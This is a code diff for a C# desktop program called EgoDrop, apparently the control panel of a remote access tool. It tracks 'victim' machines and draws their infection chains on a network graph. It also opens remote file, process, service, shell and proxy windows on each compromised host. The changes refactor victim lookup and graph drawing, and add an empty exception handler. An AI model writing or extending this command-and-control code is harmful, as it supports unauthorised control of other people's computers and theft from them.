@@ -19,19 +19,34 @@ namespace EgoDrop
             m_iniMgr = new clsIniMgr("config.ini"); //IniMgr object.
         }
 
+        #region FindVictim
+
         /// <summary>
         /// Obtain victim object from listviewitem object.
         /// </summary>
         /// <param name="item"></param>
         /// <returns></returns>
-        private clsVictim fnGetVictimFromTag(ListViewItem item) => (clsVictim)item.Tag; //Obtain victim object.
+        private clsVictim fnGetVictimFromTag(ListViewItem item) => item.Tag == null ? null : (clsVictim)item.Tag; //Obtain victim object.
 
         /// <summary>
         /// 
         /// </summary>
         /// <param name="szID"></param>
         /// <returns></returns>
-        private clsVictim fnGetVictimWithID(string szID) => (clsVictim)(listView1.FindItemWithText(szID, true, 0).Tag);
+        private clsVictim fnGetVictimWithID(string szID)
+        {
+            ListViewItem item = listView1.FindItemWithText(szID);
+            return item == null ? null : (clsVictim)item.Tag;
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="item"></param>
+        /// <returns></returns>
+        private string fnszGetVictimID(ListViewItem item) => item.SubItems[1].Text;
+
+        #endregion
 
         #region Logger
 
@@ -76,7 +91,7 @@ namespace EgoDrop
         /// <param name="ltn">Listener object.</param>
         /// <param name="victim">Victim object.</param>
         /// <param name="lsMsg">Message list.</param>
-        public void fnReceivedMessage(clsListener ltn, clsVictim victim, List<string> lsMsg)
+        public void fnReceivedMessage(clsListener ltn, clsVictim victim, string szSrcVictimID, List<string> lsMsg)
         {
             if (lsMsg.Count == 0)
                 return;
@@ -142,20 +157,43 @@ namespace EgoDrop
         {
             Invoke(new Action(() =>
             {
-                for (int i = 0; i < lsVictim.Count; i++)
+                try
                 {
-                    string szVictim = lsVictim[i];
-                    MessageBox.Show(szVictim);
+                    for (int i = 0; i < lsVictim.Count; i++)
+                    {
+                        string szVictim = lsVictim[i];
 
-                    var n1 = networkView1.AddNode(Guid.NewGuid().ToString(), $"{szVictim}", new Point(150, 100), imageList1.Images[0]);
-                    if (i == 0)
-                        continue;
+                        if (networkView1.FindNodeWithID(szVictim) != null)
+                        {
+                            continue;
+                        }
 
-                    var nodeParent = networkView1.FindNodeWithID(lsVictim[i - 1]);
-                    networkView1.AddConnection(nodeParent, n1);
+                        var n1 = networkView1.AddNode($"{szVictim}", $"{szVictim}", NetworkView.enMachineStatus.Linux_Infected);
+                        networkView1.fnSetMahcineStatus(n1, NetworkView.enMachineStatus.Linux_Infected);
 
-                    clsVictim victim = fnGetVictimWithID(szVictim);
-                    victim.m_lsVictim = lsVictim;
+                        clsVictim victim = fnGetVictimWithID(szVictim);
+                        victim.fnAddVictimChain(szVictim, lsVictim[..(i + 1)]);
+
+                        if (i == 0)
+                        {
+                            string szName = $"Firewall@{victim.m_sktClnt.RemoteEndPoint.ToString()}";
+                            if (networkView1.FindNodeWithName(szName) == null)
+                            {
+                                var fireWall = networkView1.AddNode(szName, szName, NetworkView.enMachineStatus.Firewall);
+                                networkView1.AddConnection(fireWall, n1);
+                                networkView1.MoveNodeToLeft(fireWall);
+                            }
+
+                            continue;
+                        }
+
+                        var nodeParent = networkView1.FindNodeWithID(lsVictim[i - 1]);
+                        networkView1.AddConnection(nodeParent, n1);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    
                 }
             }));
         }
@@ -170,20 +208,21 @@ namespace EgoDrop
                 treeView1.Nodes.Add(node);
             }
 
+            networkView1.imageList = imageList1;
 
             void fnTest()
             {
-                var n1 = networkView1.AddNode("Host A", "111", new Point(150, 100), imageList1.Images[0]); //Add to network view.
-                var n2 = networkView1.AddNode("Host B", "222", new Point(150, 100), imageList1.Images[0]);
-                var n3 = networkView1.AddNode("Host C", "333", new Point(150, 100), imageList1.Images[0]);
-                var n4 = networkView1.AddNode("Host D", "444", new Point(150, 100), imageList1.Images[0]);
+                var n1 = networkView1.AddNode("Host A", "111", NetworkView.enMachineStatus.Linux_Normal); //Add to network view.
+                var n2 = networkView1.AddNode("Host B", "222", NetworkView.enMachineStatus.Windows_Normal);
+                var n3 = networkView1.AddNode("Host C", "333", NetworkView.enMachineStatus.Firewall);
+                var n4 = networkView1.AddNode("Host D", "444", NetworkView.enMachineStatus.Router_Infected);
 
                 networkView1.AddConnection(n1, n2);
                 networkView1.AddConnection(n2, n3);
                 networkView1.AddConnection(n2, n4);
             }
             
-            fnTest();
+            //fnTest();
 
             networkView1.Zoom = 1.0f;
         }
@@ -237,11 +276,12 @@ namespace EgoDrop
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
+                string szVictimID = fnszGetVictimID(item);
                 clsVictim victim = fnGetVictimFromTag(item);
-                frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(victim);
+                frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(victim, szVictimID);
                 if (f == null)
                 {
-                    f = new frmFileMgr(victim);
+                    f = new frmFileMgr(szVictimID, victim);
                     f.Show();
                 }
                 else
@@ -256,8 +296,9 @@ namespace EgoDrop
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
+                string szVictimID = fnszGetVictimID(item);
                 clsVictim victim = fnGetVictimFromTag(item);
-                frmProcMgr f = clsTools.fnFindForm<frmProcMgr>(victim);
+                frmProcMgr f = clsTools.fnFindForm<frmProcMgr>(victim, szVictimID);
                 if (f == null)
                 {
                     f = new frmProcMgr(victim);
@@ -275,8 +316,9 @@ namespace EgoDrop
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
+                string szVictimID = fnszGetVictimID(item);
                 clsVictim victim = fnGetVictimFromTag(item);
-                frmSrvMgr f = clsTools.fnFindForm<frmSrvMgr>(victim);
+                frmSrvMgr f = clsTools.fnFindForm<frmSrvMgr>(victim, szVictimID);
                 if (f == null)
                 {
                     f = new frmSrvMgr(victim);
@@ -315,8 +357,9 @@ namespace EgoDrop
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
+                string szVictimID = fnszGetVictimID(item);
                 clsVictim victim = fnGetVictimFromTag(item);
-                frmShell f = clsTools.fnFindForm<frmShell>(victim);
+                frmShell f = clsTools.fnFindForm<frmShell>(victim, szVictimID);
                 if (f == null)
                 {
                     f = new frmShell(victim);
@@ -335,14 +378,14 @@ namespace EgoDrop
             if (node == null)
                 return;
 
-            string szID = node.HostID.Split('@').First();
+            string szID = node.szVictimID;
             ListViewItem item = listView1.FindItemWithText(szID, true, 0);
             if (item == null)
                 return;
 
             clsVictim victim = fnGetVictimFromTag(item);
 
-            frmServerProxy f = new frmServerProxy(victim);
+            frmServerProxy f = new frmServerProxy(szID, victim);
             f.Show();
         }
     }
